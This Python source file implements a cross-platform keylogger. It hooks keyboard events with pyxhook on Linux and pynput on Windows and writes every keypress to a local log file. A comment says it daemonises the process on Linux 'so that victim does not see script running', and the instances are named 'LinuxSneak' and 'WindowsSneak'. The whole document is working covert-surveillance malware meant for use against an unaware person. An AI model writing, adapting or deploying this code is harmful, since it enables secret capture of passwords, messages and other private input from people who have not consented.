import os
from tkinter import E
import pyxhook
import logging 
import platform
from pynput.keyboard import Key, Listener


class Keylogger:
    #Monitors keyboard events on either Windows or Linux Environments

    def __init__(self, name):
        self._name = name

    @property
    def name(self):
        return self._name
    
    @name.setter
    def name(self, n):
        self._name = n


    def linux_logging(self):
        hooker = pyxhook.HookManager()
        hooker.KeyDown = self.OnKeyboardEvent
        hooker.HookKeyboard()
        hooker.start()

    def windows_logging(self):
        hooker = [] 
        hooker.append(self.OnKeyboardEvent)
        with Listener(on_press = self.OnKeyboardEvent) as listener:          
            listener.join()

    def OnKeyboardEvent(self, event):
        if(platform.system() == 'Linux'):
            logging.debug(event.Key)
        else:
            try:
                logging.debug(event.char)
            except AttributeError:
                logging.debug(str(event))
            


if __name__ == '__main__':
    logging.basicConfig(filename='file.log', level=logging.DEBUG, 
    format= '%(message)s')

    #create a handler 
    handler = logging.getLogger().handlers[0].stream
    #create a daemon so that victim does not see script running
    if(platform.system() == 'Linux'):
        import daemon
        with daemon.DaemonContext(files_preserve=[handler]):
            keylogger = Keylogger("LinuxSneak")
            keylogger.linux_logging()
    elif(platform.system() == 'Windows'):
        keylogger = Keylogger('WindowsSneak')
        keylogger.windows_logging()